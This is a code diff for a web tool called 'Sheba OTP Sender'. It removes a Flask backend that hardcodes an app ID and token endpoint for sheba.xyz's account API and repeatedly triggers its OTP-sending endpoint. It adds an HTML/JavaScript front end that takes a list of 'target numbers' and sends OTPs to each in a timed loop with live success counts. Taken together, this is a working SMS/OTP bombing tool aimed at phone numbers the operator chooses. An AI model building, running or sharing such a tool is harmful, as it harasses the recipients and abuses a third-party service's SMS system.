@@ -1,116 +1,286 @@
-#!/usr/bin/env python3
-"""
-Sheba OTP Sender — Web UI
-Deploy on Render as a Python web service.
-Environment variables required:
-  ADMIN_PASSWORD  — your chosen password to access the tool
-  DELAY_SECONDS   — delay between OTPs (default 3)
-  SECRET_KEY      — any random string
-"""
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sheba OTP Sender</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;700;800&display=swap');
+  :root {
+    --bg:#08090d;--surface:#0f1117;--border:#1e2130;
+    --accent:#00e5a0;--accent2:#7c6af7;--red:#ff4d6d;
+    --text:#e2e8f0;--muted:#4a5568;
+    --mono:'JetBrains Mono',monospace;--sans:'Syne',sans-serif;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{background:var(--bg);color:var(--text);font-family:var(--mono);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
+  body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse 60% 40% at 20% 20%,rgba(0,229,160,.04) 0%,transparent 60%),radial-gradient(ellipse 50% 30% at 80% 80%,rgba(124,106,247,.05) 0%,transparent 60%);pointer-events:none;}
+  .container{width:100%;max-width:520px;}
+  .box{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:40px;}
+  .logo{font-family:var(--sans);font-size:22px;font-weight:800;letter-spacing:-.5px;margin-bottom:8px;}
+  .logo span{color:var(--accent);}
+  .tagline{font-size:11px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:32px;}
+  .field{margin-bottom:16px;}
+  .field label{display:block;font-size:10px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;}
+  .field input{width:100%;background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:12px 16px;color:var(--text);font-family:var(--mono);font-size:14px;outline:none;transition:border-color .2s;}
+  .field input:focus{border-color:var(--accent);}
+  .btn{width:100%;background:var(--accent);color:var(--bg);border:none;border-radius:6px;padding:13px;font-family:var(--sans);font-size:14px;font-weight:700;letter-spacing:1px;cursor:pointer;transition:opacity .2s;margin-top:8px;}
+  .btn:hover{opacity:.85;} .btn:disabled{opacity:.4;cursor:not-allowed;}
+  .btn.danger{background:var(--red);}
+  .btn.secondary{background:transparent;border:1px solid var(--border);color:var(--text);margin-top:8px;}
+  .error-msg{color:var(--red);font-size:12px;margin-top:10px;display:none;}
+  .hidden{display:none!important;}
+  .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;}
+  .logout-btn{background:none;border:1px solid var(--border);color:var(--muted);border-radius:6px;padding:6px 12px;font-family:var(--mono);font-size:11px;cursor:pointer;transition:all .2s;}
+  .logout-btn:hover{border-color:var(--red);color:var(--red);}
+  .card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:24px;margin-bottom:16px;}
+  .card-title{font-size:10px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:16px;}
+  textarea{width:100%;background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:12px 16px;color:var(--text);font-family:var(--mono);font-size:13px;resize:vertical;min-height:100px;outline:none;transition:border-color .2s;}
+  textarea:focus{border-color:var(--accent);}
+  .hint{font-size:10px;color:var(--muted);margin-top:8px;line-height:1.6;}
+  .stats-row{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:16px;}
+  .stat{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:14px;text-align:center;}
+  .stat-val{font-family:var(--sans);font-size:24px;font-weight:800;}
+  .stat-val.green{color:var(--accent);} .stat-val.red{color:var(--red);} .stat-val.purple{color:var(--accent2);}
+  .stat-label{font-size:9px;color:var(--muted);letter-spacing:1.5px;text-transform:uppercase;margin-top:4px;}
+  .progress-wrap{background:var(--bg);border-radius:3px;height:4px;margin:16px 0;overflow:hidden;}
+  .progress-bar{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:3px;transition:width .4s ease;width:0%;}
+  .log-box{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:12px;height:200px;overflow-y:auto;font-size:11px;line-height:1.8;}
+  .log-box::-webkit-scrollbar{width:3px;} .log-box::-webkit-scrollbar-thumb{background:var(--border);}
+  .log-ok{color:var(--accent);} .log-fail{color:var(--red);} .log-sys{color:var(--accent2);} .log-info{color:var(--muted);}
+  .controls{display:flex;gap:10px;}
+  .controls .btn{margin-top:0;}
+  .status-badge{display:inline-flex;align-items:center;gap:6px;font-size:11px;padding:4px 10px;border-radius:20px;background:var(--bg);border:1px solid var(--border);color:var(--muted);}
+  .dot{width:6px;height:6px;border-radius:50%;background:var(--muted);}
+  .dot.running{background:var(--accent);animation:blink 1s infinite;}
+  .dot.paused{background:#f59e0b;}
+  @keyframes blink{0%,100%{opacity:1;}50%{opacity:.2;}}
+</style>
+</head>
+<body>
 
-import os
-import logging
-import requests
-from flask import Flask, send_from_directory, request, jsonify, session
-from functools import wraps
-from datetime import timedelta
+<!-- LOGIN -->
+<div class="container" id="loginContainer">
+  <div class="box">
+    <div class="logo">Sheba <span>OTP</span></div>
+    <div class="tagline">Sender Tool — Secure Access</div>
+    <div class="field">
+      <label>Password</label>
+      <input type="password" id="pwInput" placeholder="Enter password">
+    </div>
+    <button class="btn" id="loginBtn">Access Tool</button>
+    <div class="error-msg" id="loginError">Wrong password. Try again.</div>
+  </div>
+</div>
 
-# ── Config ───────────────────────────────────────────────────────────────────
-APP_ID         = "8329815A6D1AE6DD"
-GENERATE_URL   = f"https://api-accounts.sheba.xyz/api/v1/accountkit/generate/token?app_id={APP_ID}"
-SHOOT_URL      = "https://accountkit.sheba.xyz/api/shoot-otp"
-ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
-DELAY_SECONDS  = float(os.environ.get("DELAY_SECONDS", "3"))
+<!-- MAIN APP -->
+<div class="container hidden" id="appContainer">
+  <div class="header">
+    <div>
+      <div class="logo">Sheba <span>OTP</span></div>
+      <div class="tagline">Sender Tool</div>
+    </div>
+    <div style="display:flex;align-items:center;gap:10px;">
+      <span class="status-badge">
+        <span class="dot" id="statusDot"></span>
+        <span id="statusText">Idle</span>
+      </span>
+      <button class="logout-btn" id="logoutBtn">Logout</button>
+    </div>
+  </div>
 
-logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
-log = logging.getLogger(__name__)
+  <div class="stats-row">
+    <div class="stat"><div class="stat-val green" id="statOk">0</div><div class="stat-label">Sent</div></div>
+    <div class="stat"><div class="stat-val red" id="statFail">0</div><div class="stat-label">Failed</div></div>
+    <div class="stat"><div class="stat-val purple" id="statTotal">0</div><div class="stat-label">Total</div></div>
+  </div>
 
-app = Flask(__name__, static_folder="static", template_folder="static")
-app.secret_key = os.environ.get("SECRET_KEY", "changeme-set-in-render")
-app.permanent_session_lifetime = timedelta(hours=12)
+  <div class="card">
+    <div class="card-title">Target Numbers</div>
+    <textarea id="numbersInput" placeholder="01711000001&#10;01811000002&#10;+8801911000003&#10;&#10;One number per line"></textarea>
+    <div class="hint" id="delayHint">One number per line &nbsp;·&nbsp; With or without +88 prefix</div>
+  </div>
 
-HEADERS = {
-    "Content-Type": "application/json;charset=UTF-8",
-    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
-    "Accept": "application/json",
+  <div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+
+  <div class="controls" style="margin-bottom:16px;">
+    <button class="btn" id="startBtn">&#9654; Start Sending</button>
+    <button class="btn secondary hidden" id="pauseBtn">&#9646;&#9646; Pause</button>
+    <button class="btn danger hidden" id="stopBtn">&#9632; Stop</button>
+  </div>
+
+  <div class="card">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
+      <div class="card-title" style="margin-bottom:0;">Live Log</div>
+      <button id="clearBtn" style="background:none;border:none;color:var(--muted);font-family:var(--mono);font-size:11px;cursor:pointer;">Clear</button>
+    </div>
+    <div class="log-box" id="logBox">
+      <span class="log-sys">// Ready. Enter numbers and press Start.</span>
+    </div>
+  </div>
+</div>
+
+<script>
+var DELAY_MS = 3000;
+var running = false, paused = false, stopped = false;
+var ok = 0, fail = 0, total = 0;
+
+// Load config from server
+fetch('/config').then(function(r){ return r.json(); }).then(function(d){
+  DELAY_MS = d.delay_ms || 3000;
+  var hint = document.getElementById('delayHint');
+  if(hint) hint.textContent = 'One number per line \u00b7 With or without +88 prefix \u00b7 Delay: ' + (DELAY_MS/1000) + 's';
+});
+
+// Login
+document.getElementById('loginBtn').addEventListener('click', doLogin);
+document.getElementById('pwInput').addEventListener('keydown', function(e){
+  if(e.key === 'Enter') doLogin();
+});
+
+function doLogin(){
+  var pw = document.getElementById('pwInput').value;
+  var err = document.getElementById('loginError');
+  var btn = document.getElementById('loginBtn');
+  err.style.display = 'none';
+  btn.disabled = true;
+  btn.textContent = 'Checking...';
+
+  fetch('/login', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({password: pw})
+  })
+  .then(function(r){ return r.json(); })
+  .then(function(d){
+    if(d.ok){
+      document.getElementById('loginContainer').classList.add('hidden');
+      document.getElementById('appContainer').classList.remove('hidden');
+    } else {
+      err.style.display = 'block';
+      btn.disabled = false;
+      btn.textContent = 'Access Tool';
+    }
+  })
+  .catch(function(){
+    err.textContent = 'Connection error. Try again.';
+    err.style.display = 'block';
+    btn.disabled = false;
+    btn.textContent = 'Access Tool';
+  });
 }
 
-# ── Helpers ───────────────────────────────────────────────────────────────────
-def get_fresh_token():
-    try:
-        r = requests.get(GENERATE_URL, headers=HEADERS, timeout=10)
-        data = r.json()
-        if data.get("code") == 200:
-            token = data.get("token")
-            log.info(f"Fresh token: {token[:20]}...")
-            return token
-        log.error(f"Token failed: {data}")
-        return None
-    except Exception as e:
-        log.error(f"Token error: {e}")
-        return None
+// Logout
+document.getElementById('logoutBtn').addEventListener('click', function(){
+  fetch('/logout', {method: 'POST'}).then(function(){ location.reload(); });
+});
 
-def shoot_otp(mobile, api_token):
-    try:
-        payload = {"mobile": mobile, "app_id": APP_ID, "api_token": api_token}
-        r = requests.post(SHOOT_URL, headers=HEADERS, json=payload, timeout=10)
-        data = r.json()
-        log.info(f"shoot-otp [{mobile}]: {data}")
-        if data.get("message") == "Good.":
-            return True, data.get("can_retry_after", 150)
-        return False, data.get("message", "Unknown error")
-    except Exception as e:
-        log.error(f"shoot error: {e}")
-        return False, str(e)
+// Log helpers
+function addLog(msg, cls){
+  cls = cls || 'log-info';
+  var box = document.getElementById('logBox');
+  var t = new Date().toLocaleTimeString('en-GB');
+  var div = document.createElement('div');
+  div.className = cls;
+  div.textContent = '[' + t + '] ' + msg;
+  box.appendChild(div);
+  box.scrollTop = box.scrollHeight;
+}
 
-def login_required(f):
-    @wraps(f)
-    def decorated(*args, **kwargs):
-        if not session.get("logged_in"):
-            return jsonify({"error": "Unauthorized"}), 401
-        return f(*args, **kwargs)
-    return decorated
+document.getElementById('clearBtn').addEventListener('click', function(){
+  document.getElementById('logBox').innerHTML = '';
+});
 
-# ── Routes ────────────────────────────────────────────────────────────────────
-@app.route("/")
-def index():
-    return send_from_directory("static", "index.html")
+function updateStats(){
+  document.getElementById('statOk').textContent = ok;
+  document.getElementById('statFail').textContent = fail;
+  document.getElementById('statTotal').textContent = total;
+  if(total > 0){
+    document.getElementById('progressBar').style.width = ((ok+fail)/total*100) + '%';
+  }
+}
 
-@app.route("/config")
-def config():
-    return jsonify({"delay_ms": int(DELAY_SECONDS * 1000)})
+function setStatus(state){
+  var dot = document.getElementById('statusDot');
+  var txt = document.getElementById('statusText');
+  dot.className = 'dot ' + state;
+  txt.textContent = state === 'running' ? 'Running' : state === 'paused' ? 'Paused' : 'Idle';
+}
 
-@app.route("/login", methods=["POST"])
-def login():
-    data = request.get_json()
-    if data.get("password") == ADMIN_PASSWORD:
-        session.permanent = True
-        session["logged_in"] = True
-        return jsonify({"ok": True})
-    return jsonify({"ok": False})
+function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
 
-@app.route("/logout", methods=["POST"])
-def logout():
-    session.clear()
-    return jsonify({"ok": True})
+// Start
+document.getElementById('startBtn').addEventListener('click', startSending);
 
-@app.route("/send-otp", methods=["POST"])
-@login_required
-def send_otp():
-    data   = request.get_json()
-    mobile = data.get("mobile", "").strip()
-    if not mobile:
-        return jsonify({"ok": False, "error": "No mobile number"})
-    if not mobile.startswith("+"):
-        mobile = f"+88{mobile}" if not mobile.startswith("88") else f"+{mobile}"
-    api_token = get_fresh_token()
-    if not api_token:
-        return jsonify({"ok": False, "error": "Could not get API token"})
-    success, result = shoot_otp(mobile, api_token)
-    if success:
-        return jsonify({"ok": True, "retry_after": result})
-    return jsonify({"ok": False, "error": str(result)})
+async function startSending(){
+  var raw = document.getElementById('numbersInput').value.trim();
+  if(!raw){ addLog('No numbers entered.', 'log-fail'); return; }
+  var numbers = raw.split('\n').map(function(n){ return n.trim(); }).filter(function(n){ return n.length > 0; });
+  if(!numbers.length){ addLog('No valid numbers.', 'log-fail'); return; }
 
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port, debug=False)
+  ok = 0; fail = 0; total = numbers.length;
+  running = true; paused = false; stopped = false;
+  updateStats();
+  setStatus('running');
+
+  document.getElementById('startBtn').classList.add('hidden');
+  document.getElementById('pauseBtn').classList.remove('hidden');
+  document.getElementById('stopBtn').classList.remove('hidden');
+  document.getElementById('numbersInput').disabled = true;
+
+  addLog('Starting - ' + total + ' numbers', 'log-sys');
+
+  for(var i = 0; i < numbers.length; i++){
+    if(stopped){ addLog('Stopped by user.', 'log-sys'); break; }
+    while(paused){ await sleep(500); }
+
+    var num = numbers[i];
+    addLog('[' + (i+1) + '/' + total + '] Sending to ' + num + '...', 'log-info');
+
+    try {
+      var r = await fetch('/send-otp', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({mobile: num})
+      });
+      var d = await r.json();
+      if(d.ok){
+        ok++;
+        addLog('OK ' + num + ' - OTP sent (retry after ' + d.retry_after + 's)', 'log-ok');
+      } else {
+        fail++;
+        addLog('FAIL ' + num + ' - ' + d.error, 'log-fail');
+      }
+    } catch(e){
+      fail++;
+      addLog('FAIL ' + num + ' - Network error', 'log-fail');
+    }
+
+    updateStats();
+    if(i < numbers.length - 1 && !stopped) await sleep(DELAY_MS);
+  }
+
+  if(!stopped) addLog('Done - ' + ok + ' sent, ' + fail + ' failed', 'log-sys');
+  setStatus('idle');
+  running = false;
+  document.getElementById('startBtn').classList.remove('hidden');
+  document.getElementById('pauseBtn').classList.add('hidden');
+  document.getElementById('stopBtn').classList.add('hidden');
+  document.getElementById('numbersInput').disabled = false;
+}
+
+// Pause
+document.getElementById('pauseBtn').addEventListener('click', function(){
+  paused = !paused;
+  setStatus(paused ? 'paused' : 'running');
+  this.textContent = paused ? '&#9654; Resume' : '&#9646;&#9646; Pause';
+  addLog(paused ? 'Paused.' : 'Resumed.', 'log-sys');
+});
+
+// Stop
+document.getElementById('stopBtn').addEventListener('click', function(){
+  stopped = true; paused = false;
+});
+</script>
+</body>
+</html>
